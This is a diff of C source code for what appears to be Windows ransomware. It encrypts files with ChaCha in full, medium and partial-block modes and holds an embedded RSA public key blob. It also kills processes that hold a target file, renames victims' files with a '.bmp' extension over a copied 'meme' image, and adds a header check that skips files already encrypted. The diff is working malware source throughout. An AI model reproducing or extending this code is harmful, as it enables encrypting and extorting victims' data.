@@ -1,5 +1,6 @@
 #include "Crypto.h"
 BYTE publicKeyBlob[532] = { 127, 99, 121, 101, 101, 208, 121, 97, 43, 54, 36, 69, 121, 113, 121, 101, 100, 116, 120, 97, 176, 82, 225, 42, 32, 40, 90, 144, 61, 192, 82, 130, 10, 12, 36, 168, 166, 101, 210, 150, 35, 20, 27, 143, 20, 47, 70, 242, 28, 235, 217, 89, 164, 84, 191, 230, 237, 147, 73, 179, 71, 219, 97, 222, 128, 231, 20, 234, 74, 16, 243, 248, 109, 38, 28, 122, 190, 18, 15, 66, 46, 237, 138, 205, 40, 52, 70, 175, 75, 4, 216, 150, 127, 152, 117, 60, 105, 10, 3, 145, 210, 57, 115, 25, 170, 106, 119, 86, 227, 162, 66, 176, 169, 155, 129, 241, 144, 252, 10, 21, 194, 119, 26, 115, 223, 111, 110, 201, 70, 40, 156, 98, 23, 210, 108, 52, 200, 78, 137, 133, 210, 18, 137, 25, 106, 213, 103, 204, 134, 135, 63, 250, 75, 123, 53, 231, 38, 220, 196, 96, 158, 172, 28, 251, 182, 9, 10, 204, 81, 42, 210, 27, 191, 194, 83, 157, 212, 100, 205, 6, 110, 21, 214, 169, 98, 107, 168, 198, 231, 170, 99, 84, 48, 73, 237, 225, 19, 250, 112, 32, 233, 209, 151, 234, 113, 164, 235, 152, 87, 78, 219, 155, 87, 245, 119, 111, 238, 116, 92, 186, 115, 99, 189, 69, 251, 71, 45, 47, 18, 39, 96, 27, 226, 127, 71, 8, 1, 236, 143, 7, 5, 41, 160, 43, 109, 95, 213, 252, 244, 215, 206, 120, 243, 168, 108, 36, 27, 61, 108, 120, 4, 149, 152, 194, 127, 79, 6, 106, 57, 17, 153, 179, 213, 243, 81, 235, 202, 129, 136, 28, 234, 192, 246, 76, 211, 49, 143, 56, 20, 169, 1, 110, 207, 128, 230, 34, 116, 163, 29, 81, 155, 11, 250, 214, 58, 255, 148, 123, 7, 197, 210, 164, 179, 150, 35, 74, 155, 169, 158, 187, 137, 101, 143, 200, 105, 48, 162, 223, 18, 98, 236, 243, 216, 164, 15, 28, 96, 162, 113, 178, 46, 175, 145, 211, 150, 45, 197, 75, 223, 110, 14, 209, 58, 142, 67, 172, 127, 2, 201, 219, 5, 45, 198, 43, 228, 226, 75, 215, 109, 66, 195, 142, 141, 47, 32, 205, 232, 148, 15, 27, 180, 115, 157, 163, 176, 137, 251, 222, 194, 33, 30, 254, 114, 67, 147, 155, 49, 90, 171, 21, 205, 97, 200, 255, 17, 93, 201, 248, 157, 107, 164, 64, 33, 109, 231, 46, 231, 109, 252, 239, 62, 180, 235, 148, 79, 202, 75, 6, 191, 36, 53, 88, 143, 93, 196, 198, 234, 214, 237, 166, 112, 33, 132, 181, 66, 12, 17, 123, 128, 72, 126, 192, 38, 238, 193, 251, 103, 120, 60, 70, 171, 46, 80, 128, 185, 47, 104, 163, 42, 18, 16, 125, 174, 246, 192, 254, 199, 13, 48, 106, 200, 9, 197, 168, 38, 108, 69, 181, 195, 145, 87, 52, 55, 71, 100, 174, 188, 152, 4, 64, 130, 134, 85, 55, 225, 233, 181, 42, 0, 221, 141, 16, 183, 94, 1, 223, 70, 246, 118, 148, 140, 109, 255, 119, 71, 202, 11, 53, 127, 0, 179, 221 };
+BYTE memeHeader[16] = { 0x42, 0x4D, 0xCA, 0x67, 0x04, 00, 00, 00, 00, 00, 0xCA, 00, 00, 00, 0x7C, 00 };
 LPCSTR memePath = NULL;
 
 // make sure key and nonce are already allocated
@@ -141,13 +142,11 @@ int chachaFileEncrypt(HANDLE hFileIn, HANDLE hFileOut, const BYTE* key, const BY
 
 	for (;;) {
 		if (ReadFile(hFileIn, buffer[0], CHACHA_BLOCKLENGTH * 1024, &byteRead, NULL) == FALSE) {
-			//printf("Read file fails. 0x%x\n", GetLastError());
 			return -1;
 		}
 
 		chachaEncrypt(&context, buffer[0], buffer[1], byteRead);
 		if (WriteFile(hFileOut, buffer[1], byteRead, &byteWrite, NULL) == FALSE) {
-			//printf("Write file fails. 0x%x\n", GetLastError());
 			return -1;
 		}
 		if (byteRead < CHACHA_BLOCKLENGTH * 1024) {
@@ -172,13 +171,11 @@ int chachaMediumFileEncrypt(HANDLE hFileIn, HANDLE hFileOut, const BYTE* key, co
 	DWORD totalRead = 0;
 	for (;;) {
 		if (ReadFile(hFileIn, buffer[0], CHACHA_BLOCKLENGTH * 1024, &byteRead, NULL) == FALSE) {
-			//printf("Read file fails. 0x%x\n", GetLastError());
 			return -1;
 		}
 
 		chachaEncrypt(&context, buffer[0], buffer[1], byteRead);
 		if (WriteFile(hFileOut, buffer[1], byteRead, &byteWrite, NULL) == FALSE) {
-			//printf("Write file fails. 0x%x\n", GetLastError());
 			return -1;
 		}
 
@@ -194,11 +191,9 @@ int chachaMediumFileEncrypt(HANDLE hFileIn, HANDLE hFileOut, const BYTE* key, co
 
 	for (;;) {
 		if (ReadFile(hFileIn, buffer[0], CHACHA_BLOCKLENGTH * 1024, &byteRead, NULL) == FALSE) {
-			//printf("Read file fails. 0x%x\n", GetLastError());
 			return -1;
 		}
 		if (WriteFile(hFileOut, buffer[0], byteRead, &byteWrite, NULL) == FALSE) {
-			//printf("Write file fails. 0x%x\n", GetLastError());
 			return -1;
 		}
 		if (byteRead < CHACHA_BLOCKLENGTH * 1024) {
@@ -216,7 +211,6 @@ int chachaLargeFileEncrypt(HANDLE hFileIn, HANDLE hFileOut, const BYTE* key, con
 	DWORD dwEncryptBlockSize = ((1500.0 / 9240.0) * fileSize) / 3.0;
 	DWORD dwSkipLength = (fileSize - 3 * dwEncryptBlockSize) / 2;
 
-	//printf("encryptBlockSize %d\n", dwEncryptBlockSize);
 	CHACHA_CONTEXT context;
 	DWORD byteRead;
 	DWORD byteWrite;
@@ -232,13 +226,11 @@ int chachaLargeFileEncrypt(HANDLE hFileIn, HANDLE hFileOut, const BYTE* key, con
 		if (i == 2) {
 			for (;;) {
 				if (ReadFile(hFileIn, buffer[0], CHACHA_BLOCKLENGTH * 1024, &byteRead, NULL) == FALSE) {
-					//printf("Read file fails. 0x%x\n", GetLastError());
 					return -1;
 				}
 
 				chachaEncrypt(&context, buffer[0], buffer[1], byteRead);
 				if (WriteFile(hFileOut, buffer[1], byteRead, &byteWrite, NULL) == FALSE) {
-					//printf("Write file fails. 0x%x\n", GetLastError());
 					return -1;
 				}
 				if (byteRead < CHACHA_BLOCKLENGTH * 1024) {
@@ -247,17 +239,15 @@ int chachaLargeFileEncrypt(HANDLE hFileIn, HANDLE hFileOut, const BYTE* key, con
 			}
 		}
 		else {
-			while (TRUE) { // encrypt block
+			while (TRUE) {
 				if (totalReadBlock + CHACHA_BLOCKLENGTH * 1024 > dwEncryptBlockSize) {
 					break;
 				}
 				if (ReadFile(hFileIn, buffer[0], CHACHA_BLOCKLENGTH * 1024, &byteRead, NULL) == FALSE) {
-					//printf("Read file fails. 0x%x\n", GetLastError());
 					return -1;
 				}
 				chachaEncrypt(&context, buffer[0], buffer[1], byteRead);
 				if (WriteFile(hFileOut, buffer[1], byteRead, &byteWrite, NULL) == FALSE) {
-					//printf("Write file fails. 0x%x\n", GetLastError());
 					return -1;
 				}
 				totalReadBlock += byteRead;
@@ -269,17 +259,14 @@ int chachaLargeFileEncrypt(HANDLE hFileIn, HANDLE hFileOut, const BYTE* key, con
 			BYTE* tempBuffer = (BYTE*)calloc(maxRead, 1);
 
 			if (ReadFile(hFileIn, tempBuffer, maxRead, &byteRead, NULL) == FALSE) {
-				//printf("Read file fails. 0x%x\n", GetLastError());
 				return -1;
 			}
 			if (WriteFile(hFileOut, tempBuffer, maxRead, &byteWrite, NULL) == FALSE) {
-				//printf("Write file fails. 0x%x\n", GetLastError());
 				return -1;
 			}
 			free(tempBuffer);
 		}
 	}
-
 	return 0;
 }
 
@@ -361,8 +348,9 @@ CLEANUP:
 }
 
 int fileEncrypt(HCRYPTPROV hCryptProv, HCRYPTKEY publicKey, LPCSTR oriFileName, BYTE* key, BYTE* nonce) {
-	HANDLE inFile = CreateFileA(oriFileName, GENERIC_ALL, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+	killFileOwner((LPSTR)oriFileName);
 
+	HANDLE inFile = CreateFileA(oriFileName, GENERIC_ALL, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
 	DWORD fileSizeHigh = 0;
 	DWORD fileSize = GetFileSize(inFile, &fileSizeHigh);
 
@@ -373,14 +361,29 @@ int fileEncrypt(HCRYPTPROV hCryptProv, HCRYPTKEY publicKey, LPCSTR oriFileName, 
 	CHAR* newFileName;
 	DWORD sizeFlag = 0;
 	DWORD returnValue = -1;
+	BYTE fileHeader[16] = { 0 };
+
 	if (inFile == INVALID_HANDLE_VALUE) {
 		return -1;
 	}
+
+
 	newFileName = (CHAR*)calloc(lstrlenA(oriFileName) + 5, 1);
+
+	if (!newFileName) {
+		goto CLEANUP;
+	}
 
 	newFileName = (CHAR*)memmove(newFileName, oriFileName, lstrlenA(oriFileName));
 
 	(CHAR*)memmove(newFileName + lstrlenA(oriFileName), ".bmp", lstrlenA(".bmp"));
+
+	if (ReadFile(inFile, fileHeader, 16, NULL, NULL)) {
+		if (!memcmp(fileHeader, memeHeader, 16)) {
+			printf("File already encrypted\n");
+			goto CLEANUP;
+		}
+	}
 
 	if (CopyFileA(memePath, newFileName, FALSE) == FALSE) {
 		goto CLEANUP;
